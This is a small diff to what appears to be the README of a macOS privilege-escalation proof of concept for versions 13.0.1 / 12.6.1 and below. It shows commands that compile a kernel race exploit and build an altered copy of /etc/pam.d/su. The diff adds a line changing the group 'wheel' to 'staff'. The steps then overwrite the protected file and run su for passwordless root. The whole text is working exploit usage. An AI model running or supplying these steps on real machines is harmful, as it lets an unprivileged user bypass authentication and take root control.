@@ -8,6 +8,7 @@ On a macOS 13.0.1 / 12.6.1 (or below) machine, run:
 ```
 clang -o switcharoo vm_unaligned_copy_switch_race.c
 sed -e "s/rootok/permit/g" /etc/pam.d/su > overwrite_file.bin
+sed -i '' "s/wheel/staff/g" overwrite_file.bin
 ./switcharoo /etc/pam.d/su overwrite_file.bin
 su
 ```
